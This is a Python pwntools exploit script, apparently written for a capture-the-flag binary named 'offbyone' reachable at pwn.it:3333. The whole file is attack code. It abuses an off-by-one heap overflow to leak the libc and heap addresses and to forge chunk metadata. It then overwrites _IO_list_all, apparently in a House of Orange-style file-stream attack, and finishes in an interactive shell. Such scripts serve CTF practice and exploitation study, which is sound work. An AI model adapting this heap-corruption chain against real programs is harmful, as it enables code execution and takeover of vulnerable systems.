#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
os.environ["LD_LIBRARY_PATH"]="/dbg64/lib/"
pwn_file="./offbyone"
elf=ELF(pwn_file)
libc=ELF("/dbg64/lib/libc.so.6")

heap_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("libc address: 0x%x"%libc.address)
    log.debug("heap address: 0x%x"%heap_address)
    log.debug("process pid:%d"%pid)
    pause()

def add(size,content):
    conn.sendlineafter("4:edit\n","1")
    conn.sendlineafter("input len\n",str(size))
    conn.sendafter("input your data\n",content)

def show(idx):
    conn.sendlineafter("4:edit\n","3")
    conn.sendlineafter("input id\n",str(idx))
    return conn.recvuntil("1:creat")[:-len("1:creat")]

def dele(idx):
    conn.sendlineafter("4:edit\n","2")
    conn.sendlineafter("input id\n",str(idx))

def edit(idx,content):
    conn.sendlineafter("4:edit\n","4")
    conn.sendlineafter("input id\n",str(idx))
    conn.send(content)

add(0xd8,"a")
add(0xd8,"a")
add(0xd8,"a")
add(0xd8,"a")
add(0xd8,"a")
add(0xd8,"a")
add(0xd8,"a"*0xd8)
add(0xd8,"a")
add(0xd8,"a"*0xd6)
f={
    0xd0:p64(0x700),
    0xd8:p64(0xe0),
}
edit(6,fit(f,filler="\x00"))
dele(7)
add(0xd8,"a"*0xd0)
libc.address=u64(show(1).ljust(8,"\x00"))-libc.sym["main_arena"]-0x58
dele(3)
add(0xf0,"a"*0xf0)
heap_address=u64(show(1).ljust(8,"\x00"))-0x3e0
f={
    0x88:p64(0xe1),
    0x90:p64(heap_address+0x20),
    0x98:p64(heap_address+0x3a0),
}
#edit(7,fit(f,filler="\x00"))
f={
    0xb8:p64(0xe1),
    0xc0:p64(heap_address+0x20),
    0xc8:p64(libc.sym["main_arena"]+0x128),
}
edit(3,fit(f,filler="\x00"))
add(0xd0,"a"*0xd0)
f={
    0x38:p64(0x91),
    0x40:p64(0),
    0x48:p64(libc.sym["_IO_list_all"]-0x10),
}
edit(9,fit(f,filler="\x00"))
debug()

conn.sendlineafter("4:edit\n","1")
conn.sendlineafter("input len\n",str(0x80))
conn.interactive()

